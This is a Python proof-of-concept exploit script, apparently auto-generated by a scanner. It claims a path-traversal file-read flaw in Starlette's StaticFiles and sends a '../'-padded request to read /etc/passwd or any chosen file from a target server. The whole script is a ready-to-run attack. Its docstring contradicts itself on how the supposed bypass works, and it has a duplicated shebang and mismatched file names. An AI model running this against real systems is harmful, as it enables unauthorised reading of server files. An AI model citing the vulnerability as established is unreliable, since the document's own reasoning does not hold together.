#!/usr/bin/env python3
# PoC for starlette (/home/xcy/.local/lib/python3.14/site-packages/starlette)
# Path: suspicious-008
# Sink: get_path
# Auto-generated — run with: python3 lfi_asgi_scope_route_get_path.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: Starlette StaticFiles LFI via path traversal bypass

Vulnerability: The `get_path` method in `StaticFiles` uses `os.path.normpath` to
remove '..' components, but does NOT verify that the resulting path stays within
the intended static root directory. On Windows, drive letters (e.g., C:/) can
bypass the normalization. Additionally, symlinks within the static directory can
point to arbitrary files outside the root.

This PoC demonstrates reading a known system file (e.g., /etc/passwd on Linux)
by exploiting the missing containment check. The payload uses a simple '..'
traversal since `os.path.normpath` only removes '..' sequences that would go
above the root of the path, but does not prevent traversal relative to the
static root directory.

Usage:
    python3 starlette_lfi_poc.py [--target http://localhost:8000] [--static-path /static]

Requirements:
    - Python 3.6+
    - requests library (pip install requests)
"""

import argparse
import sys
import urllib.parse

try:
    import requests
except ImportError:
    print("[-] This PoC requires the 'requests' library. Install with: pip install requests")
    sys.exit(1)


def exploit(target_url: str, static_path: str, file_to_read: str) -> None:
    """
    Attempt to read an arbitrary file via path traversal in Starlette's StaticFiles.

    Args:
        target_url: Base URL of the Starlette application (e.g., http://localhost:8000)
        static_path: The URL path where static files are served (e.g., /static)
        file_to_read: Absolute path of the file to read (e.g., /etc/passwd)
    """
    # Construct the traversal payload
    # We need to go up from the static root to the filesystem root, then to the target file
    # The number of '..' depends on how deep the static root is mounted.
    # Typically, static files are served from a subdirectory like /static/files/...
    # We'll use a generous number of '..' to reach the root.
    traversal_depth = 10  # Should be enough for most setups
    traversal = "../" * traversal_depth

    # Build the full path: /static/../../../../etc/passwd
    # The static_path should start with '/', e.g., /static
    payload_path = f"{static_path}/{traversal}{file_to_read.lstrip('/')}"

    # URL-encode the path to avoid issues with special characters
    encoded_path = urllib.parse.quote(payload_path, safe="/")

    # Full URL
    url = f"{target_url.rstrip('/')}{encoded_path}"

    print(f"[*] Target URL: {target_url}")
    print(f"[*] Static path: {static_path}")
    print(f"[*] Attempting to read: {file_to_read}")
    print(f"[*] Request URL: {url}")

    try:
        # Send GET request with a timeout
        response = requests.get(url, timeout=10)

        # Check if the request was successful (status 200)
        if response.status_code == 200:
            print("[+] SUCCESS! File retrieved.")
            print("[+] Content:")
            print(response.text)
        elif response.status_code == 404:
            print("[-] File not found (404). The traversal may need adjustment.")
            print("[-] Try increasing the traversal depth or check the static path.")
        elif response.status_code == 403:
            print("[-] Access forbidden (403). The server may have additional protections.")
        else:
            print(f"[-] Unexpected status code: {response.status_code}")
            print(f"[-] Response body: {response.text[:500]}")
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection error: Could not reach {target_url}")
        print("[-] Ensure the target server is running and accessible.")
    except requests.exceptions.Timeout:
        print("[-] Request timed out. The server may be slow or unreachable.")
    except Exception as e:
        print(f"[-] An unexpected error occurred: {e}")


def main():
    parser = argparse.ArgumentParser(
        description="PoC for Starlette StaticFiles LFI (path traversal bypass)"
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8000",
        help="Target URL (default: http://localhost:8000)",
    )
    parser.add_argument(
        "--static-path",
        default="/static",
        help="Static files URL path (default: /static)",
    )
    parser.add_argument(
        "--file",
        default="/etc/passwd",
        help="File to read (default: /etc/passwd)",
    )
    args = parser.parse_args()

    # Sanity check: ensure static path starts with /
    if not args.static_path.startswith("/"):
        print("[-] Static path must start with '/' (e.g., /static)")
        sys.exit(1)

    exploit(args.target, args.static_path, args.file)


if __name__ == "__main__":
    main()
